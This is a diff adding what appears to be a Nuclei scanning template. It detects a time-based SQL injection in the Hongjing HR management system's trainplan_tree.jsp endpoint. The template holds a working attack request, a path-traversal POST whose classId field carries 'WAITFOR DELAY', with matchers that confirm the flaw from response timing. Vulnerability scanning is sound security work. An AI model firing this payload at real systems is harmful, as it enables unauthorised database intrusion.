@@ -1,0 +1,36 @@
+id: hjsoft-trainplan-tree-sqli
+
+info:
+  name: 宏景人力资源信息管理系统 trainplan_tree.jsp - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: todo
+  tags: hjsoft,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        classId=1;WAITFOR DELAY '0:0:6'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains_all(body,'TreeNode')
+        condition: and
